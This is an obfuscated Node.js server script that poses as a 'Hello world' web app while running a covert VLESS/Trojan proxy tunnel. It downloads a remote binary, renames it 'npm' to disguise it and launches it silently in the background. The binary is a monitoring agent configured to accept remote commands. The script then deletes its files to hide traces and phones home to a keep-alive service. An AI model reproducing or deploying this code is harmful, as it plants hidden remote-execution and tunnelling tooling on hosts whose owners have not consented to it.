const _0x54883b=_0x7729;(function(_0x5ebcd5,_0x2bec31){const _0x250ee2=_0x7729,_0x2e5951=_0x5ebcd5();while(!![]){try{const _0x9f2194=parseInt(_0x250ee2(0xf6))/0x1+-parseInt(_0x250ee2(0x13d))/0x2+parseInt(_0x250ee2(0x130))/0x3+-parseInt(_0x250ee2(0xeb))/0x4+parseInt(_0x250ee2(0xf1))/0x5*(-parseInt(_0x250ee2(0xe2))/0x6)+-parseInt(_0x250ee2(0xe0))/0x7*(-parseInt(_0x250ee2(0x148))/0x8)+parseInt(_0x250ee2(0x139))/0x9;if(_0x9f2194===_0x2bec31)break;else _0x2e5951['push'](_0x2e5951['shift']());}catch(_0x2cbd9c){_0x2e5951['push'](_0x2e5951['shift']());}}}(_0x320e,0x3ecb9));const os=require('os'),http=require(_0x54883b(0x125)),fs=require('fs'),axios=require('axios'),net=require(_0x54883b(0x10b)),path=require(_0x54883b(0x140)),crypto=require(_0x54883b(0x11f)),{Buffer}=require(_0x54883b(0xdf)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x54883b(0x143)][_0x54883b(0xdd)]||_0x54883b(0x12e),NEZHA_SERVER=process[_0x54883b(0x143)][_0x54883b(0x146)]||'',NEZHA_PORT=process[_0x54883b(0x143)][_0x54883b(0x126)]||'',NEZHA_KEY=process[_0x54883b(0x143)][_0x54883b(0xe6)]||'',DOMAIN=process[_0x54883b(0x143)][_0x54883b(0x11a)]||_0x54883b(0x13e),AUTO_ACCESS=process['env'][_0x54883b(0x10f)]||![],WSPATH=process[_0x54883b(0x143)][_0x54883b(0x120)]||UUID[_0x54883b(0x123)](0x0,0x8),SUB_PATH=process[_0x54883b(0x143)]['SUB_PATH']||_0x54883b(0x11e),NAME=process[_0x54883b(0x143)]['NAME']||'',PORT=process['env'][_0x54883b(0x11b)]||0xbb8;function _0x7729(_0x684e35,_0x3a3c58){const _0x320e38=_0x320e();return _0x7729=function(_0x772906,_0x5ce5d3){_0x772906=_0x772906-0xdd;let _0x1d808b=_0x320e38[_0x772906];return _0x1d808b;},_0x7729(_0x684e35,_0x3a3c58);}let ISP='';const GetISP=async()=>{const _0x4684f0=_0x54883b;try{const _0x3e2aa2=await axios[_0x4684f0(0xf4)](_0x4684f0(0x107)),_0xa85cb2=_0x3e2aa2['data'];ISP=(_0xa85cb2[_0x4684f0(0xf3)]+'-'+_0xa85cb2[_0x4684f0(0x150)])[_0x4684f0(0x115)](/ /g,'_');}catch(_0x3551bb){ISP=_0x4684f0(0xe9);}};GetISP();const httpServer=http[_0x54883b(0x145)]((_0x3f9f6e,_0x2a56b1)=>{const _0x5189aa=_0x54883b;if(_0x3f9f6e[_0x5189aa(0xf9)]==='/'){const _0x349027=path[_0x5189aa(0x147)](__dirname,'index.html');fs['readFile'](_0x349027,_0x5189aa(0x127),(_0x561103,_0xff2f9)=>{const _0xf814f7=_0x5189aa;if(_0x561103){_0x2a56b1[_0xf814f7(0x114)](0xc8,{'Content-Type':_0xf814f7(0x10d)}),_0x2a56b1['end'](_0xf814f7(0x134));return;}_0x2a56b1['writeHead'](0xc8,{'Content-Type':_0xf814f7(0x10d)}),_0x2a56b1['end'](_0xff2f9);});return;}else{if(_0x3f9f6e['url']==='/'+SUB_PATH){const _0x57ca2e=NAME?NAME+'-'+ISP:ISP,_0x14f9e7=_0x5189aa(0x136)+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+_0x5189aa(0x108)+DOMAIN+_0x5189aa(0x142)+WSPATH+'#'+_0x57ca2e,_0x827d5c='trojan://'+UUID+_0x5189aa(0x116)+DOMAIN+_0x5189aa(0x108)+DOMAIN+_0x5189aa(0x142)+WSPATH+'#'+_0x57ca2e,_0x436e8a=_0x14f9e7+'\x0a'+_0x827d5c,_0x1fad6e=Buffer[_0x5189aa(0xed)](_0x436e8a)[_0x5189aa(0x124)]('base64');_0x2a56b1[_0x5189aa(0x114)](0xc8,{'Content-Type':_0x5189aa(0xf7)}),_0x2a56b1[_0x5189aa(0x131)](_0x1fad6e+'\x0a');}else _0x2a56b1[_0x5189aa(0x114)](0x194,{'Content-Type':'text/plain'}),_0x2a56b1[_0x5189aa(0x131)](_0x5189aa(0x13b));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x54883b(0x115)](/-/g,''),DNS_SERVERS=[_0x54883b(0x118),'1.1.1.1'];function resolveHost(_0x2e6aa8){return new Promise((_0x180e2f,_0x9d81dc)=>{const _0x497dd9=_0x7729;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x497dd9(0x106)](_0x2e6aa8)){_0x180e2f(_0x2e6aa8);return;}let _0x50a7ae=0x0;function _0x38a149(){const _0x2fdc3e=_0x497dd9;if(_0x50a7ae>=DNS_SERVERS[_0x2fdc3e(0xf2)]){_0x9d81dc(new Error(_0x2fdc3e(0x141)+_0x2e6aa8+_0x2fdc3e(0x121)));return;}const _0x77e715=DNS_SERVERS[_0x50a7ae];_0x50a7ae++;const _0x33f6e8=_0x2fdc3e(0x104)+encodeURIComponent(_0x2e6aa8)+'&type=A';axios['get'](_0x33f6e8,{'timeout':0x1388,'headers':{'Accept':_0x2fdc3e(0x129)}})[_0x2fdc3e(0x13f)](_0x4485eb=>{const _0x3f8ab2=_0x2fdc3e,_0x423a93=_0x4485eb[_0x3f8ab2(0x14f)];if(_0x423a93[_0x3f8ab2(0xf5)]===0x0&&_0x423a93['Answer']&&_0x423a93[_0x3f8ab2(0xe1)][_0x3f8ab2(0xf2)]>0x0){const _0x3d0297=_0x423a93[_0x3f8ab2(0xe1)][_0x3f8ab2(0x112)](_0x5db4ce=>_0x5db4ce['type']===0x1);if(_0x3d0297){_0x180e2f(_0x3d0297['data']);return;}}_0x38a149();})['catch'](_0x444728=>{_0x38a149();});}_0x38a149();});}function _0x320e(){const _0x3834b5=['every','find','2096','writeHead','replace','@cdns.doon.eu.org:443?security=tls&sni=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','8.8.4.4','send','DOMAIN','PORT','catch','includes','sub','crypto','WSPATH','\x20with\x20all\x20DNS\x20servers','listen','slice','toString','http','NEZHA_PORT','utf8','once','application/dns-json','toUpperCase','config.yaml','map','https://arm64.ssss.nyc.mn/agent','d231eca6-c002-4ff7-8316-a0583c43fcf3','trim','973821CcBvzU','end','readUInt16BE','2083','Hello\x20world!','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','vless://','https://arm64.ssss.nyc.mn/v1','connection','2770353BMXnQI','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','Not\x20Found\x0a','concat','359502lIcoaN','12345.abc.com','then','path','Failed\x20to\x20resolve\x20','&path=%2F','env','decode','createServer','NEZHA_SERVER','join','40FjDBqC','npm\x20running\x20error:','client_secret:\x20','update','https://amd64.ssss.nyc.mn/v1','substr','8443','data','asOrganization','write','UUID','\x20-p\x20','buffer','154931lkaKSY','Answer','1835250ueEpdo','/bin/bash','readUInt8','log','NEZHA_KEY','setsid\x20nohup\x20./npm\x20-s\x20','https://oooo.serv00.net/add-url','Unknown','close','214536pZsQVs','finish','from','https://amd64.ssss.nyc.mn/agent','true','unlink','5lkSNIT','length','country','get','Status','53380aeRYsk','text/plain','writeFileSync','url','npm','error','chmod\x20+x\x20npm','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','pipe','443','npm\x20is\x20already\x20running,\x20skip\x20running...','connect','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','--tls','https://dns.google/resolve?name=','utf-8','test','https://speed.cloudflare.com/meta','&fp=chrome&type=ws&host=','sha224','post','net','arm64','text/html','npm\x20is\x20running','AUTO_ACCESS','2053'];_0x320e=function(){return _0x3834b5;};return _0x320e();}function handleVlessConnection(_0x5ab782,_0x38d8c8){const _0x5d5643=_0x54883b,[_0x3bc7dc]=_0x38d8c8,_0x441f1e=_0x38d8c8['slice'](0x1,0x11);if(!_0x441f1e['every']((_0x5e795a,_0x2e2add)=>_0x5e795a==parseInt(uuid[_0x5d5643(0x14d)](_0x2e2add*0x2,0x2),0x10)))return![];let _0x36028a=_0x38d8c8['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x754f45=_0x38d8c8[_0x5d5643(0x123)](_0x36028a,_0x36028a+=0x2)['readUInt16BE'](0x0),_0x2ee6de=_0x38d8c8[_0x5d5643(0x123)](_0x36028a,_0x36028a+=0x1)['readUInt8'](),_0x2d6c17=_0x2ee6de==0x1?_0x38d8c8['slice'](_0x36028a,_0x36028a+=0x4)[_0x5d5643(0x147)]('.'):_0x2ee6de==0x2?new TextDecoder()[_0x5d5643(0x144)](_0x38d8c8[_0x5d5643(0x123)](_0x36028a+0x1,_0x36028a+=0x1+_0x38d8c8[_0x5d5643(0x123)](_0x36028a,_0x36028a+0x1)[_0x5d5643(0xe4)]())):_0x2ee6de==0x3?_0x38d8c8[_0x5d5643(0x123)](_0x36028a,_0x36028a+=0x10)['reduce']((_0x381bd2,_0xdd60e9,_0x26ab4f,_0x5b2b0f)=>_0x26ab4f%0x2?_0x381bd2[_0x5d5643(0x13c)](_0x5b2b0f[_0x5d5643(0x123)](_0x26ab4f-0x1,_0x26ab4f+0x1)):_0x381bd2,[])['map'](_0xa9970b=>_0xa9970b[_0x5d5643(0x132)](0x0)[_0x5d5643(0x124)](0x10))[_0x5d5643(0x147)](':'):'';_0x5ab782[_0x5d5643(0x119)](new Uint8Array([_0x3bc7dc,0x0]));const _0x15bbf5=createWebSocketStream(_0x5ab782);return resolveHost(_0x2d6c17)[_0x5d5643(0x13f)](_0x33846f=>{net['connect']({'host':_0x33846f,'port':_0x754f45},function(){const _0x138ad3=_0x7729;this['write'](_0x38d8c8[_0x138ad3(0x123)](_0x36028a)),_0x15bbf5['on'](_0x138ad3(0xfb),()=>{})['pipe'](this)['on'](_0x138ad3(0xfb),()=>{})[_0x138ad3(0xfe)](_0x15bbf5);})['on']('error',()=>{});})[_0x5d5643(0x11c)](_0x47f7b6=>{const _0x111bb4=_0x5d5643;net[_0x111bb4(0x101)]({'host':_0x2d6c17,'port':_0x754f45},function(){const _0xebb204=_0x111bb4;this[_0xebb204(0x151)](_0x38d8c8['slice'](_0x36028a)),_0x15bbf5['on']('error',()=>{})[_0xebb204(0xfe)](this)['on'](_0xebb204(0xfb),()=>{})['pipe'](_0x15bbf5);})['on'](_0x111bb4(0xfb),()=>{});}),!![];}function handleTrojanConnection(_0x361b01,_0x5107fc){const _0x2d52e3=_0x54883b;try{if(_0x5107fc['length']<0x3a)return![];const _0x365cc2=_0x5107fc[_0x2d52e3(0x123)](0x0,0x38)[_0x2d52e3(0x124)](),_0x3e44d1=[UUID,UUID[_0x2d52e3(0x115)](/-/g,''),UUID['toUpperCase'](),UUID[_0x2d52e3(0x115)](/-/g,'')[_0x2d52e3(0x12a)]()];let _0x45b1fe=null;for(const _0x1d102c of _0x3e44d1){const _0x511a31=crypto['createHash'](_0x2d52e3(0x109))[_0x2d52e3(0x14b)](_0x1d102c)['digest']('hex');if(_0x511a31===_0x365cc2){_0x45b1fe=_0x1d102c;break;}}if(!_0x45b1fe)return![];let _0x2a8bba=0x38;_0x5107fc[_0x2a8bba]===0xd&&_0x5107fc[_0x2a8bba+0x1]===0xa&&(_0x2a8bba+=0x2);const _0x10721f=_0x5107fc[_0x2a8bba];if(_0x10721f!==0x1)return![];_0x2a8bba+=0x1;const _0x22533f=_0x5107fc[_0x2a8bba];_0x2a8bba+=0x1;let _0x1c6dd9,_0x347b81;if(_0x22533f===0x1)_0x1c6dd9=_0x5107fc[_0x2d52e3(0x123)](_0x2a8bba,_0x2a8bba+0x4)[_0x2d52e3(0x147)]('.'),_0x2a8bba+=0x4;else{if(_0x22533f===0x3){const _0x3c8966=_0x5107fc[_0x2a8bba];_0x2a8bba+=0x1,_0x1c6dd9=_0x5107fc[_0x2d52e3(0x123)](_0x2a8bba,_0x2a8bba+_0x3c8966)[_0x2d52e3(0x124)](),_0x2a8bba+=_0x3c8966;}else{if(_0x22533f===0x4)_0x1c6dd9=_0x5107fc[_0x2d52e3(0x123)](_0x2a8bba,_0x2a8bba+0x10)['reduce']((_0x3639c3,_0x5337b7,_0x561999,_0x4aa637)=>_0x561999%0x2?_0x3639c3[_0x2d52e3(0x13c)](_0x4aa637['slice'](_0x561999-0x1,_0x561999+0x1)):_0x3639c3,[])[_0x2d52e3(0x12c)](_0x10ce11=>_0x10ce11['readUInt16BE'](0x0)[_0x2d52e3(0x124)](0x10))[_0x2d52e3(0x147)](':'),_0x2a8bba+=0x10;else return![];}}_0x347b81=_0x5107fc['readUInt16BE'](_0x2a8bba),_0x2a8bba+=0x2;_0x2a8bba<_0x5107fc[_0x2d52e3(0xf2)]&&_0x5107fc[_0x2a8bba]===0xd&&_0x5107fc[_0x2a8bba+0x1]===0xa&&(_0x2a8bba+=0x2);const _0x5eb87b=createWebSocketStream(_0x361b01);return resolveHost(_0x1c6dd9)[_0x2d52e3(0x13f)](_0x49840e=>{const _0x35958a=_0x2d52e3;net[_0x35958a(0x101)]({'host':_0x49840e,'port':_0x347b81},function(){const _0x55f6df=_0x35958a;_0x2a8bba<_0x5107fc[_0x55f6df(0xf2)]&&this[_0x55f6df(0x151)](_0x5107fc[_0x55f6df(0x123)](_0x2a8bba)),_0x5eb87b['on'](_0x55f6df(0xfb),()=>{})[_0x55f6df(0xfe)](this)['on']('error',()=>{})[_0x55f6df(0xfe)](_0x5eb87b);})['on'](_0x35958a(0xfb),()=>{});})['catch'](_0x5ba2f5=>{const _0x525b88=_0x2d52e3;net[_0x525b88(0x101)]({'host':_0x1c6dd9,'port':_0x347b81},function(){const _0x1caf7c=_0x525b88;_0x2a8bba<_0x5107fc[_0x1caf7c(0xf2)]&&this[_0x1caf7c(0x151)](_0x5107fc[_0x1caf7c(0x123)](_0x2a8bba)),_0x5eb87b['on'](_0x1caf7c(0xfb),()=>{})[_0x1caf7c(0xfe)](this)['on'](_0x1caf7c(0xfb),()=>{})[_0x1caf7c(0xfe)](_0x5eb87b);})['on'](_0x525b88(0xfb),()=>{});}),!![];}catch(_0x126da8){return![];}}wss['on'](_0x54883b(0x138),(_0x54084f,_0x3033a2)=>{const _0x2e8361=_0x54883b,_0x347667=_0x3033a2[_0x2e8361(0xf9)]||'';_0x54084f[_0x2e8361(0x128)]('message',_0x4e4527=>{const _0x39a7ed=_0x2e8361;if(_0x4e4527[_0x39a7ed(0xf2)]>0x11&&_0x4e4527[0x0]===0x0){const _0x486d47=_0x4e4527[_0x39a7ed(0x123)](0x1,0x11),_0x513185=_0x486d47[_0x39a7ed(0x111)]((_0x3343e2,_0x295435)=>_0x3343e2==parseInt(uuid['substr'](_0x295435*0x2,0x2),0x10));if(_0x513185){!handleVlessConnection(_0x54084f,_0x4e4527)&&_0x54084f[_0x39a7ed(0xea)]();return;}}!handleTrojanConnection(_0x54084f,_0x4e4527)&&_0x54084f[_0x39a7ed(0xea)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x3355ec=_0x54883b,_0x5b433f=os['arch']();return _0x5b433f==='arm'||_0x5b433f===_0x3355ec(0x10c)||_0x5b433f==='aarch64'?!NEZHA_PORT?_0x3355ec(0x137):_0x3355ec(0x12d):!NEZHA_PORT?_0x3355ec(0x14c):_0x3355ec(0xee);},downloadFile=async()=>{const _0x23dffc=_0x54883b;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x110c8b=getDownloadUrl(),_0x53be46=await axios({'method':_0x23dffc(0xf4),'url':_0x110c8b,'responseType':'stream'}),_0x19cc25=fs['createWriteStream'](_0x23dffc(0xfa));return _0x53be46[_0x23dffc(0x14f)][_0x23dffc(0xfe)](_0x19cc25),new Promise((_0xf6aa37,_0x77136c)=>{const _0x47ba58=_0x23dffc;_0x19cc25['on'](_0x47ba58(0xec),()=>{const _0x5ca99c=_0x47ba58;console[_0x5ca99c(0xe5)]('npm\x20download\x20successfully'),exec(_0x5ca99c(0xfc),_0x41e6ba=>{if(_0x41e6ba)_0x77136c(_0x41e6ba);_0xf6aa37();});}),_0x19cc25['on'](_0x47ba58(0xfb),_0x77136c);});}catch(_0x4785f2){throw _0x4785f2;}},runnz=async()=>{const _0x37f3dc=_0x54883b;try{const _0x4cb3ae=execSync(_0x37f3dc(0xfd),{'encoding':_0x37f3dc(0x105)});if(_0x4cb3ae[_0x37f3dc(0x12f)]()!==''){console[_0x37f3dc(0xe5)](_0x37f3dc(0x100));return;}}catch(_0x568540){}await downloadFile();let _0x9ced17='',_0x59df43=[_0x37f3dc(0xff),_0x37f3dc(0x14e),_0x37f3dc(0x113),'2087',_0x37f3dc(0x133),_0x37f3dc(0x110)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x473999=_0x59df43['includes'](NEZHA_PORT)?_0x37f3dc(0x103):'';_0x9ced17=_0x37f3dc(0xe7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x37f3dc(0xde)+NEZHA_KEY+'\x20'+_0x473999+_0x37f3dc(0x102);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xabc1d4=NEZHA_SERVER[_0x37f3dc(0x11d)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x166bfe=_0x59df43[_0x37f3dc(0x11d)](_0xabc1d4)?_0x37f3dc(0xef):'false',_0x16b55a=_0x37f3dc(0x14a)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x37f3dc(0x135)+_0x166bfe+_0x37f3dc(0x117)+UUID;fs[_0x37f3dc(0xf8)](_0x37f3dc(0x12b),_0x16b55a);}_0x9ced17='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x37f3dc(0xe5)](_0x37f3dc(0x13a));return;}}try{exec(_0x9ced17,{'shell':_0x37f3dc(0xe3)},_0x590a26=>{const _0xe906cd=_0x37f3dc;if(_0x590a26)console[_0xe906cd(0xfb)](_0xe906cd(0x149),_0x590a26);else console['log'](_0xe906cd(0x10e));});}catch(_0x5e776f){console[_0x37f3dc(0xfb)]('error:\x20'+_0x5e776f);}};async function addAccessTask(){const _0xdf00a9=_0x54883b;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x39dc15='https://'+DOMAIN+'/'+SUB_PATH;try{const _0xae54d=await axios[_0xdf00a9(0x10a)](_0xdf00a9(0xe8),{'url':_0x39dc15},{'headers':{'Content-Type':'application/json'}});console[_0xdf00a9(0xe5)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x4213ce){}}const delFiles=()=>{const _0x2ad445=_0x54883b;fs[_0x2ad445(0xf0)](_0x2ad445(0xfa),()=>{}),fs[_0x2ad445(0xf0)](_0x2ad445(0x12b),()=>{});};httpServer[_0x54883b(0x122)](PORT,()=>{const _0x4792de=_0x54883b;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4792de(0xe5)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
